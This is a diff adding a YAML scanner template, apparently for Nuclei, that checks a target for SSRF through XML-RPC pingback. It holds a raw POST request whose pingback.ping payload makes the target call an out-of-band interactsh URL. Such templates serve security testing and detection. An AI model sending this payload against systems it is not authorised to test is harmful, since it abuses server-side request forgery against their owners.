@@ -1,0 +1,44 @@
+http:
+- matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - http
+  raw:
+  - 'POST /xmlrpc/pingback HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <methodCall>
+
+    <methodName>pingback.ping</methodName>
+
+    <params>
+
+    <param>
+
+    <value>http://{{interactsh-url}}</value>
+
+    </param>
+
+    </params>
+
+    </methodCall>
+
+    '
+id: xmlrpc-pingback-ssrf
+info:
+  author: geeknik
+  description: XMLRPC Pingback leads to SSRF.
+  metadata:
+    max-request: 1
+  name: XMLRPC Pingback SSRF
+  reference:
+  - https://hackerone.com/reports/406387
+  severity: high
+  tags: xmlrpc,hackerone,ssrf,generic
